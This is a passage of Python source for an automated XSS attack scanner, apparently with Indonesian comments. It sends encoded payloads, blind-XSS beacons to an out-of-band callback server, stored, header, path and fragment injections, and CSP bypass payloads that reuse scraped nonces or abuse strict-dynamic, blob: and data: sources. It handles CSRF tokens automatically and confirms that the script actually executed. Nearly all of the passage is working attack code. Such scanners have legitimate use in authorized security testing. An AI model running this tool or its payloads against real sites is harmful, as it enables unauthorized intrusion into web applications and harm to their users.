        for raw in DEFAULT_XSS_PAYLOADS["html_tag_injection"]:
            for tech, variant in generate_encoding_variants(raw).items():
                tpl = dict(template)
                tpl[name] = variant
                req_url, _, body = prepare_request_args(url, method, tpl, is_form)

                content = fetch_dynamic_html(req_url) or ""
                # butuh cermin minimal (raw/decoded)
                if raw not in content and raw not in decode_all(content):
                    logger.debug(f"[encoding:{tech}] not reflected")
                    continue

                if confirm_execution(req_url):
                    _progress_newline()
                    console.print(
                        Panel(
                            f"[technique: {tech}] âœ… True XSS Executed!\n"
                            f"Base payload : {raw}\n"
                            f"Variant      : {variant}\n"
                            f"URL          : {req_url}",
                            title="[bright_green]Encoding Execution Success[/bright_green]",
                        )
                    )
                    f = {"url": req_url, "param": name, "base_payload": raw, "payload": variant, "technique": tech, "type": "encoding"}
                    self.vulns.append(self._classify(f, executed=True))
                    return True
                else:
                    logger.debug(f"[encoding:{tech}] reflected but NOT executed")
        return False

    # ----- Phase 3: Blind-XSS OOB -----
    def _phase_oob(self, url, method, name, template, is_form):
        from oast import generate_token, build_beacon_vectors, check_paths_for_poll
        token = generate_token()
        vectors = build_beacon_vectors(token)

        # Kirim beberapa vektor OAST secara bertahap
        sent = 0
        for key in ("js_fetch", "script_src", "img", "css_bg", "link"):
            payload = vectors.get(key)
            if not payload:
                continue
            tpl = dict(template)
            tpl[name] = payload
            oob_url, _, oob_body = prepare_request_args(url, method, tpl, is_form)
            try:
                if method == "GET" and not is_form:
                    fetch_dynamic_html(oob_url)
                else:
                    headers = None
                    data = oob_body
                    if method == "POST" and not is_form:
                        headers = {"Content-Type": "application/json"}
                        data = json.dumps(oob_body) if isinstance(oob_body, dict) else oob_body
                    headers, data = apply_csrf(oob_url, method, data if isinstance(data, dict) else {}, headers)
                    make_request(oob_url, method, data=data, headers=headers)
                sent += 1
            except Exception:
                continue

        _progress_newline()
        console.print(f"[debug] OAST beacons injected: token={token} sent={sent}")

        # SSE (server-sent events)
        try:
            client = SSEClient(f"{OOB_BASE_URL}/{token}/events")
            for msg in client.events():
                data = msg.data.decode("utf-8", "ignore") if isinstance(msg.data, bytes) else msg.data
                _progress_newline()
                console.print(f"[bold green]Blind-XSS SSE![/bold green] data={data}")
                self.vulns.append(self._classify({"url": url, "param": name, "payload": f"<oast:{token}>", "type": "blind-xss"}))
                return True
        except Exception:
            pass

        # Polling fallback (try multiple check paths)
        check_paths = check_paths_for_poll(token)
        for _ in range(20):
            time.sleep(1)
            for p in check_paths:
                try:
                    res = requests.get(p, timeout=5)
                    if res.ok and (res.headers.get("content-type", "")).startswith("application/json"):
                        if res.json().get("hit"):
                            console.print("[bold green]Blind-XSS Detected via polling![/bold green]")
                            self.vulns.append(self._classify({"url": url, "param": name, "payload": f"<oast:{token}>", "type": "blind-xss"}))
                            return True
                except Exception:
                    continue
        return False

    # ----- Phase 3.5: Stored-XSS Probe (lightweight) -----
    def _phase_stored(self, url, method, name, template, is_form):
        token = f"STOREDXSS-{int(time.time())}"
        tpl = dict(template)
        tpl[name] = token
        inj_url, _, body = prepare_request_args(url, method, tpl, is_form)
        # Send injection
        if method == "GET" and not is_form:
            make_request(inj_url)
        else:
            headers = None
            data = body
            if method == "POST" and not is_form:
                headers = {"Content-Type": "application/json"}
                data = json.dumps(body) if isinstance(body, dict) else body
            headers, data = apply_csrf(inj_url, method, data if isinstance(data, dict) else {}, headers)
            make_request(inj_url, method, data=data, headers=headers)

        # Candidate pages to revisit
        cand = []
        try:
            p = urlparse(url)
            base_no_q = url.split("?")[0]
            root = f"{p.scheme}://{p.netloc}/"
            cand = [base_no_q, root]
        except Exception:
            cand = [url]

        for u in cand:
            html = fetch_dynamic_html(u) or ""
            if token in html or contains_unescaped(html, token):
                executed = confirm_execution(u)
                title = "[HIGH] Stored XSS Executed" if executed else "[INFO] Stored reflection detected"
                console.print(Panel(f"URL: {u}\nParam: {name}\nMarker: {token}", title=title))
                f = {"url": u, "param": name, "payload": token, "type": "stored" if executed else "stored_reflection"}
                self.vulns.append(self._classify(f, executed=executed))
                return True
        # Jadwalkan revisit untuk jalur lambat (5 menit dan 1 jam)
        try:
            for u in cand:
                self.schedule_revisit(u, token, delay_seconds=300, note="stored-5min")
                self.schedule_revisit(u, token, delay_seconds=3600, note="stored-1h")
        except Exception:
            pass
        return False

    # ----- Phase 3.6: Header Reflection Probe -----
    def _phase_header_reflection(self, url, method, name, template, is_form):
        probe = f"HDRPROBE-{int(time.time())}"
        headers_list = [
            "User-Agent", "Referer", "X-Forwarded-For", "X-Original-URL"
        ]
        tried_hdr, hits_hdr = 0, 0
        _print_progress(f"[header] tried={tried_hdr} hits={hits_hdr} | hdr: -")
        for h in headers_list:
            try:
                resp = make_request(url, method=method, data=None, headers={h: probe})
            except Exception:
                continue
            if not resp:
                continue
            body = resp.text or ""
            tried_hdr += 1
            had = contains_unescaped(body, probe) or contains_unescaped((fetch_dynamic_html(url) or ""), probe)
            if had:
                hits_hdr += 1
            _print_progress(f"[header] tried={tried_hdr} hits={hits_hdr} | hdr: {h}")
            if had:
                # Coba beberapa payload sederhana via header
                for p in DEFAULT_XSS_PAYLOADS.get("polyglot", [])[:3]:
                    try:
                        r2 = make_request(url, method=method, data=None, headers={h: p})
                    except Exception:
                        continue
                    page_html = fetch_dynamic_html(url) or (r2.text if r2 else "")
                    if contains_unescaped(page_html, p):
                        executed = confirm_execution(url)
                        title = "[HIGH] XSS via Header" if executed else "[INFO] Reflection via Header"
                        _progress_newline()
                        console.print(Panel(f"Header: {h}\nPayload: {p}\nURL: {url}", title=title))
                        f = {"url": url, "param": f"<header:{h}>", "payload": p, "type": "header"}
                        self.vulns.append(self._classify(f, executed=executed))
                        return True
                # Jika hanya refleksi
                _progress_newline()
                console.print(Panel(f"Header: {h}\nReflected marker: {probe}\nURL: {url}", title="[INFO] Header Reflected"))
                f = {"url": url, "param": f"<header:{h}>", "payload": probe, "type": "header_reflection"}
                self.vulns.append(self._classify(f))
                return True
        return False

    # ----- Phase 3.7: Path and Fragment Injection Probe -----
    def _phase_path_fragment(self, url, method, name, template, is_form):
        try:
            parts = urlsplit(url)
            base_no_q = urlunsplit((parts.scheme, parts.netloc, parts.path, '', ''))
        except Exception:
            base_no_q = url.split('?')[0].split('#')[0]

        # pilih beberapa payload kecil untuk efisiensi
        candidates = []
        candidates += DEFAULT_XSS_PAYLOADS.get('polyglot', [])[:1]
        candidates += DEFAULT_XSS_PAYLOADS.get('html_tag_injection', [])[:1]
        candidates += ['<svg onload=alert(1)>']

        tried_path = tried_frag = hits_path = hits_frag = 0
        _print_progress(f"[path] tried={tried_path} hits={hits_path} | [frag] tried={tried_frag} hits={hits_frag} | last: -")
        for p in candidates:
            # Path segment injection (raw and encoded) + beberapa suffix umum
            for variant in (p, quote(p)):
                for suffix in ("", "/", ".html"):
                    test_url = base_no_q.rstrip('/') + '/' + variant + suffix
                    content = fetch_dynamic_html(test_url) or ''
                    tried_path += 1
                    had = contains_unescaped(content, p)
                    if had:
                        hits_path += 1
                        executed = confirm_execution(test_url)
                        title = "[HIGH] Path XSS Executed" if executed else "[INFO] Path reflection detected"
                        _progress_newline()
                        console.print(Panel(f"URL: {test_url}\nPayload: {p}", title=title))
                        f = {"url": test_url, "param": name, "payload": p, "type": "path"}
                        self.vulns.append(self._classify(f, executed=executed))
                        return True
                    else:
                        _print_progress(f"[path] tried={tried_path} hits={hits_path} | [frag] tried={tried_frag} hits={hits_frag} | last: {_short_url(test_url)}")
                    if had:
                        hits_path += 1

            # Fragment injection (client-side only)
            frag_url = base_no_q + '#' + p
            content = fetch_dynamic_html(frag_url) or ''
            tried_frag += 1
            had = contains_unescaped(content, p)
            if had:
                hits_frag += 1
                executed = confirm_execution(frag_url)
                title = "[HIGH] Fragment XSS Executed" if executed else "[INFO] Fragment reflection detected"
                _progress_newline()
                console.print(Panel(f"URL: {frag_url}\nPayload: {p}", title=title))
                f = {"url": frag_url, "param": name, "payload": p, "type": "fragment"}
                self.vulns.append(self._classify(f, executed=executed))
                return True
            else:
                _print_progress(f"[path] tried={tried_path} hits={hits_path} | [frag] tried={tried_frag} hits={hits_frag} | last: {_short_url(frag_url)}")
            # hits counters updated above
        return False

    # ----- Phase 4: CSP-Aware / Nonce/Hash Bypass -----
    def _phase_csp(self, url, method, name, template, is_form):
        try:
            head = requests.head(url, timeout=6)
            directives = parse_csp(head.headers.get("Content-Security-Policy", ""))
            script_src = [s.strip() for s in directives.get("script-src", [])]
            nonces_hdr = extract_nonces(script_src)
        except Exception:
            script_src, nonces_hdr = [], []

        # Tambahan: cari nonce dari HTML (rendered) bila ada
        html_main = None
        try:
            html_main = fetch_dynamic_html(url) or ""
        except Exception:
            html_main = None
        nonces_html = []
        if html_main:
            from utils import extract_nonces_from_html
            nonces_html = extract_nonces_from_html(html_main)

        nonces = list(dict.fromkeys(list(nonces_hdr) + list(nonces_html)))

        allow_data = any(s.lower().startswith("data:") for s in script_src)
        allow_blob = any(s.lower().startswith("blob:") for s in script_src)
        unsafe_inline = "'unsafe-inline'" in script_src
        unsafe_eval = "'unsafe-eval'" in script_src
        strict_dynamic = any(s.lower() == "'strict-dynamic'" for s in script_src)

        csp_payloads = []
        # Inline script dengan nonce jika tersedia
        for n in nonces:
            csp_payloads.append(f'<script nonce="{n}">alert(1)</script>')
            csp_payloads.append(f'<script type="module" nonce="{n}">alert(1)</script>')
            if unsafe_eval:
                csp_payloads.append(f'<script nonce="{n}">new Function("alert(1)")()</script>')
            if strict_dynamic:
                # Trusted inline script (nonce) creates nonced script nodes → allowed by strict-dynamic
                csp_payloads.append(
                    f"<script nonce=\"{n}\">var s=document.createElement('script');"
                    "s.text='alert(1)';document.body.appendChild(s);</script>"
                )
            if allow_blob:
                csp_payloads.append(
                    f"<script nonce=\"{n}\">"
                    "var b=new Blob(['alert(1)'],{type:'text/javascript'});"
                    "var u=URL.createObjectURL(b);var s=document.createElement('script');"
                    "s.src=u;document.body.appendChild(s);"
                    "</script>"
                )
            if allow_data:
                csp_payloads.append(
                    f"<script nonce=\"{n}\">var s=document.createElement('script');"
                    "s.src='data:text/javascript,alert(1)';document.body.appendChild(s);</script>"
                )
                csp_payloads.append(
                    f"<script type=\"module\" nonce=\"{n}\">import('data:text/javascript,alert(1)')</script>"
                )

        # Inline tanpa nonce bila diizinkan
        if unsafe_inline:
            csp_payloads.append("<script>alert(1)</script>")

        # External-like vectors (jika diizinkan)
        if allow_data:
            csp_payloads.append('<script src="data:text/javascript,alert(1)"></script>')
        # Non-script vectors — berguna ketika script benar-benar diblokir
        csp_payloads += ["<img src=x onerror=alert(1)>", "<svg onload=alert(1) />"]

        # Uji payload satu per satu
        for p in csp_payloads:
            tpl = dict(template)
            tpl[name] = p
            url_csp, _, body_csp = prepare_request_args(url, method, tpl, is_form)
            resp = None
            if method == "GET" and not is_form:
                resp = make_request(url_csp)
            else:
                headers = None
                data = body_csp
                if method == "POST" and not is_form:
                    headers = {"Content-Type": "application/json"}
                    data = json.dumps(body_csp) if isinstance(body_csp, dict) else body_csp
                headers, data = apply_csrf(url_csp, method, data if isinstance(data, dict) else {}, headers)
                resp = make_request(url_csp, method, data=data, headers=headers)
            if resp and (p in resp.text or p in decode_all(resp.text)):
                _progress_newline()
                console.print(Panel(f"URL: {resp.url}\nParam: {name}\nPayload: {p}", title="[magenta]CSP-Aware XSS[/magenta]"))
                self.vulns.append(self._classify({"url": resp.url, "param": name, "payload": p, "type": "csp_bypass"}))
                return True

        return False

    # ----- Phase 5: Probe + Progressive (engine berbasis profil) -----
    def _phase_probe_progressive(self, url, method, name, template, is_form, probe):
        tpl = dict(template)
        tpl[name] = probe
        req, _, body = prepare_request_args(url, method, tpl, is_form)
        if method == "GET" and not is_form:
            resp = make_request(req)
        else:
            headers = None
            data = body
            if method == "POST" and not is_form:
                headers = {"Content-Type": "application/json"}
                data = json.dumps(body) if isinstance(body, dict) else body
            headers, data = apply_csrf(req, method, data if isinstance(data, dict) else {}, headers)
            resp = make_request(req, method, data=data, headers=headers)
        html0 = resp.text if resp else ""
        if not contains_unescaped(html0, probe) and not contains_unescaped((fetch_dynamic_html(req) or ""), probe):
            logger.info(f"[probe] no reflection for {name}")
            return False

        # Extract CSP header if present
        csp_header = ""
        try:
            if resp and getattr(resp, 'headers', None):
                csp_header = resp.headers.get("Content-Security-Policy", "") or ""
        except Exception:
            csp_header = ""

        return self._probe_and_bypass(url, method, name, template, is_form, html0, probe, csp_header)

    def _probe_and_bypass(self, url, method, name, template, is_form, raw_html, probe, csp_header: str = ""):
        # Precompute sequence length to provide ETA/progress
        try:
            prof = self.engine.analyze_sanitization(raw_html or "", probe or "")
            # Attach CSP flags from header to profile (overrides meta)
            if (csp_header or "").strip():
                from utils import parse_csp, derive_csp_flags
                prof.csp_flags = derive_csp_flags(parse_csp(csp_header))
            seq = self.engine.generate_sequence(prof)
            total = len(seq)
        except Exception:
            total = 300
        t0 = time.time()

        def _cb(idx: int):
            try:
                _print_progress(f"[probe] {idx}/{total} ETA={_fmt_eta(total, idx, t0)}")
            except Exception:
                pass

        result = self.engine.test_progressive(url, method, name, template, is_form, raw_html, probe, progress_cb=_cb)
        if not result:
            return False

        final = result["url"]
        param = result.get("parameter", name)
        resp = make_request(final)
        rendered = fetch_dynamic_html(final) or (resp.text if resp else raw_html)

        if contains_unescaped(rendered, result["payload"]):
            executed = confirm_execution(final)
            title = "[HIGH] Executable XSS" if executed else "[INFO] Reflected (Unescaped)"
            _progress_newline()
            console.print(Panel(f"URL: {final}\nParam: {param}\nPayload: {result['payload']}", title=title))
            self.vulns.append(self._classify({"url": final, "param": param, "payload": result["payload"], "type": "executed" if executed else "reflected"}, executed=executed))
            return True

        logger.info(f"[bypass-false] {result['payload']}")
        return False

    # ----- Phase 6: Coverage-Guided -----
    def _phase_coverage(self, url, method, name, template, is_form, raw_html, probe):
        try:
            baseline = run_with_coverage(url, "")
        except Exception:
            baseline = 0

        candidates = self.payloads.get("polyglot", []) + self.payloads.get("html_tag_injection", [])
        scored = []
        total = len(candidates)
        i = 0
        t0 = time.time()
        _print_progress(f"[coverage] scored=0/{total} ETA={_fmt_eta(total, 0, t0)}")
        for p in candidates:
            try:
                cov = run_with_coverage(url, f"document.body.insertAdjacentHTML('beforeend', `{p}`);")
                scored.append((cov - baseline, p))
            except Exception:
                continue
            finally:
                i += 1
                if i % self.progress_every == 0:
                    _print_progress(f"[coverage] scored={i}/{total} ETA={_fmt_eta(total, i, t0)}")

        scored.sort(reverse=True, key=lambda x: x[0])
        for j, (_, p) in enumerate(scored[:5], start=1):
            tpl = dict(template)
            tpl[name] = p
            req3, _, body3 = prepare_request_args(url, method, tpl, is_form)
            if method == "GET" and not is_form:
                resp3 = make_request(req3)
            else:
                headers = None
                data = body3
                if method == "POST" and not is_form:
                    headers = {"Content-Type": "application/json"}
                    data = json.dumps(body3) if isinstance(body3, dict) else body3
                headers, data = apply_csrf(req3, method, data if isinstance(data, dict) else {}, headers)
                resp3 = make_request(req3, method, data=data, headers=headers)
            _print_progress(f"[coverage] test_top={j}/5 | {name}@{_short_url(req3)} | pl: {_preview_payload(p)}")
            if resp3 and contains_unescaped(resp3.text, p):
                _progress_newline()
                console.print(Panel(f"URL: {resp3.url}\nParam: {name}\nPayload: {p}", title="[green]Coverage-Guided XSS[/green]"))
                self.vulns.append(self._classify({"url": resp3.url, "param": name, "payload": p, "type": "coverage"}))
                return True
        return False

    # ----- Phase 7: Static Context-Aware (Paralel) -----
    def _run_static_tests(self, url, method, name, template, is_form, contexts, sanitizer_map):
        futures = []
        total = 0
        t0 = time.time()
        found = 0
        for ctx in contexts or ["html_tag"]:
            for cat in CONTEXT_TO_PAYLOADS.get(ctx, []):
                for payload in self.payloads.get(cat, []):
                    if not filter_payload_by_sanitizer(payload, sanitizer_map):
                        continue
                    mutated = mutate_payload_by_sanitizer(payload, sanitizer_map)
                    # Coba kedua versi (asli & mutated) paralel
                    for pl in (payload, mutated):
                        futures.append(
                            self._executor.submit(self._static_worker, url, method, name, template, is_form, pl, cat)
                        )
                        total += 1

        done = 0
        for f in as_completed(futures):
            res = f.result()
            done += 1
            if res:
                found += 1
            if done % self.progress_every == 0 or res:
                _print_progress(f"[static] tested {done}/{total} hits={found} ETA={_fmt_eta(total, done, t0)} | {name}@{_short_url(url)}")
            if res:
                sev = get_xss_severity(contexts, res["payload"], res["response_text"])
                note = "[yellow]Mutated due to filter[/yellow]\n" if res["mutated"] else ""
                _progress_newline()
                console.print(
                    Panel(f"{note}{sev}\nURL: {res['url']}\nParam: {res['param']}\nPayload: {res['payload']}", title="[red]Static XSS Detected[/red]")
                )
                self.vulns.append(self._classify(res))
                return

    def _static_worker(self, url, method, name, template, is_form, payload, category):
        tpl = dict(template)
        tpl[name] = payload
        req, _, body = prepare_request_args(url, method, tpl, is_form)
        try:
            if method == "GET" and not is_form:
                resp = make_request(req)
            else:
                headers = None
                data = body
                if method == "POST" and not is_form:
                    headers = {"Content-Type": "application/json"}
                    data = json.dumps(body) if isinstance(body, dict) else body
                headers, data = apply_csrf(req, method, data if isinstance(data, dict) else {}, headers)
                resp = make_request(req, method, data=data, headers=headers)
        except Exception as e:
            logger.debug(f"static test error: {e}")
            return None
        if resp and contains_unescaped(resp.text, payload):
            return {
                "url": resp.url,
                "param": name,
                "payload": payload,
                "response_text": resp.text,
                "type": f"static_{category}",
                "mutated": payload not in self.payloads.get(category, []),
            }
        return None

    # ----- Util: render HTML utk analisis konteks -----
    def _get_rendered_html(self, url, method, name, template, is_form, probe):
        tpl = dict(template)
        tpl[name] = probe
        req, _, body = prepare_request_args(url, method, tpl, is_form)
        if method == "GET" and not is_form:
            return fetch_dynamic_html(req) or ""
        if method == "GET" and not is_form:
            resp = make_request(req)
        else:
            headers = None
            data = body
            if method == "POST" and not is_form:
                headers = {"Content-Type": "application/json"}
                data = json.dumps(body) if isinstance(body, dict) else body
            resp = make_request(req, method, data=data, headers=headers)
        return resp.text if resp else ""

    # ----- Deteksi konteks sederhana (regex + decode_all) -----
    def _detect_contexts(self, html_content: str, probe: str):
        if not html_content:
            return []
        unesc = decode_all(html_content)
        esc = re.escape(probe)
        rules = {
            "html_tag": rf">{esc}<",
            "script_tag": rf"<script\b[^>]*>[^<]*{esc}[^<]*</script>",
            "attr_unquoted": rf"\b[\w-]+\s*=\s*{esc}(?=[\s>])",
            "attr_quoted": rf'\b[\w-]+\s*=\s*([\'"]){esc}\1',
            "js_string": rf'([\'"]){esc}\1',
            "uri_scheme": rf"(javascript|data|vbscript)\s*:\s*{esc}",
            "css_url": rf"url\([^)]*{esc}[^)]*\)",
            "polyglot": rf"(['\"`]).*{esc}.*\1",
            "event_handler": rf"\bon[a-z]+\s*=\s*(['\"])?{esc}\1?",
            "css_expression": rf"expression\([^)]*{esc}[^)]*\)",
            "template_literal": rf"`[^`]*{esc}[^`]*`",
            "tag_comment": rf"<!--[^>]*{esc}[^>]*-->",
            "data_attribute": rf"\bdata-[\w-]+\s*=\s*(['\"])?{esc}\1?",
            "srcdoc_attr": rf"\bsrcdoc\s*=\s*(['\"]).*{esc}.*\1",
        }
        ctxs = []
        for name, pat in rules.items():
            if re.search(pat, html_content, re.I | re.S) or re.search(pat, unesc, re.I | re.S):
                ctxs.append(name)
        if probe in (html_content or "") and not ctxs:
            ctxs.append("unknown")
        logger.debug(f"[detect_contexts] probe={probe!r} â†’ {ctxs}")
        return ctxs

# --- Minimal ANSI color helper (like cli) ---
_COL = {
    "red": "31", "green": "32", "yellow": "33", "blue": "34",
    "magenta": "35", "cyan": "36", "bold": "1"
}
_ANSI_ENABLED = True  # CLI already enables Windows ANSI; safe to assume here

def color(text: str, name: str | None = None) -> str:
    if not name:
        return text
    code = _COL.get(name)
    if not code:
        return text
    return f"\033[{code}m{text}\033[0m"
